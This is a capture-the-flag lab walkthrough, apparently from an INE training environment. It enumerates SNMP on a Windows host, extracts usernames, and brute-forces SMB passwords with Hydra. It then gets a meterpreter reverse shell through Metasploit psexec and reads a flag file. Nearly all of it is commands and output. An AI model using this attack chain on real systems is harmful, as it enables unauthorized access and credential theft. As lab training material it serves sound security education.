# SNMP Enumeration

### Commands
`snmpwalk`\
An SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.\
Object Identifier (OID) may be given on the command line.

```bash
# One target machine this time
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.9        INE
127.0.0.1 AttackDefense-Kali
10.10.43.3      INE
10.0.18.172    demo.ine.local

# Nmapping default SNMP port
└─# nmap -sU -p 161 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 13:35 IST
Nmap scan report for demo.ine.local (10.0.18.172)
Host is up (0.0046s latency).

PORT    STATE SERVICE
161/udp open  snmp
```

```bash
# Available Nmap scripts
└─# ls -al /usr/share/nmap/scripts/ | grep -e "snmp"
-rw-r--r-- 1 root root  7816 Jun 20  2024 snmp-brute.nse
-rw-r--r-- 1 root root  4388 Jun 20  2024 snmp-hh3c-logins.nse
-rw-r--r-- 1 root root  5216 Jun 20  2024 snmp-info.nse
-rw-r--r-- 1 root root 28644 Jun 20  2024 snmp-interfaces.nse
-rw-r--r-- 1 root root  5978 Jun 20  2024 snmp-ios-config.nse
-rw-r--r-- 1 root root  4156 Jun 20  2024 snmp-netstat.nse
-rw-r--r-- 1 root root  4431 Jun 20  2024 snmp-processes.nse
-rw-r--r-- 1 root root  1857 Jun 20  2024 snmp-sysdescr.nse
-rw-r--r-- 1 root root  2570 Jun 20  2024 snmp-win32-services.nse
-rw-r--r-- 1 root root  2739 Jun 20  2024 snmp-win32-shares.nse
-rw-r--r-- 1 root root  4713 Jun 20  2024 snmp-win32-software.nse
-rw-r--r-- 1 root root  2016 Jun 20  2024 snmp-win32-users.nse


└─# ls -al /usr/share/nmap/nselib/data/ | grep snmp
-rw-r--r-- 1 root root     806 Jun 20  2024 snmpcommunities.lst

# Show more detailed information
└─# nmap -sU -p 161 --script=snmp-brute demo.ine.local 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 13:42 IST
Nmap scan report for demo.ine.local (10.0.18.172)
Host is up (0.0037s latency).

# Found 3 community strings
PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials
```

Explore snmp vulns
```bash
# SNMP service detection
└─# nmap -sU -p 161 -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 13:44 IST
Nmap scan report for demo.ine.local (10.0.18.172)
Host is up (0.0031s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)   <- V1
Service Info: Host: AttackDefense

# -v : Specify SNMP version to use
# -c : Set the community string
└─# snmpwalk -v 1 -c public demo.ine.local
~~~~~
iso.3.6.1.2.1.55.1.12.1.6.4.16.255.2.0.0.0.0.0.0.0.0.0.0.0.0.0.251 = INTEGER: 1
iso.3.6.1.2.1.55.1.12.1.6.4.16.255.2.0.0.0.0.0.0.0.0.0.0.0.1.0.2 = INTEGER: 1
iso.3.6.1.2.1.55.1.12.1.6.4.16.255.2.0.0.0.0.0.0.0.0.0.0.0.1.0.3 = INTEGER: 1
iso.3.6.1.2.1.55.1.12.1.6.4.16.255.2.0.0.0.0.0.0.0.0.0.1.255.248.137.164 = INTEGER: 1

# Write result in "snmp_info" file
└─# nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info

# Read the file
# 5 accounts found
└─# cat snmp_info 
~~~~~~
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|_  admin
~~~~~

# Bruteforce password for admin and administrator
└─# hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-22 13:55:28
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: administrator   password: elizabeth 

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-22 13:55:30

└─# hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-22 14:02:28
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-22 14:02:29
```

Metasploit
```bash
msf6 > use windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.18.172
RHOSTS => 10.0.18.172
msf6 exploit(windows/smb/psexec) > set SMBPass tinkerbell
SMBPass => tinkerbell
msf6 exploit(windows/smb/psexec) > set SMBUser admin
SMBUser => admin

# admin didn't work.
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf6 exploit(windows/smb/psexec) > set SMBPass elizabeth
SMBPass => elizabeth
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.43.3:4444 
[*] 10.0.18.172:445 - Connecting to the server...
[*] 10.0.18.172:445 - Authenticating to 10.0.18.172:445 as user 'administrator'...
[*] 10.0.18.172:445 - Selecting PowerShell target
[*] 10.0.18.172:445 - Executing the payload...
[+] 10.0.18.172:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 10.0.18.172
[*] Meterpreter session 1 opened (10.10.43.3:4444 -> 10.0.18.172:49922) at 2025-07-22 14:19:46 +0530

meterpreter > 
```
Capture the flag
```bash
meterpreter > shell
Process 1248 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
01/03/2022  08:28 AM                70 FLAG1.txt
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/07/2020  07:47 AM    <DIR>          Program Files
11/07/2020  07:47 AM    <DIR>          Program Files (x86)
11/07/2020  08:15 AM    <DIR>          Users
11/07/2020  07:49 AM    <DIR>          Utilities
11/07/2020  12:42 AM    <DIR>          Windows
               1 File(s)             70 bytes
               7 Dir(s)  16,012,742,656 bytes free

C:\>type FLAG1.txt
type FLAG1.txt
a8f5f167f44f4964e6c998dee827110c
```




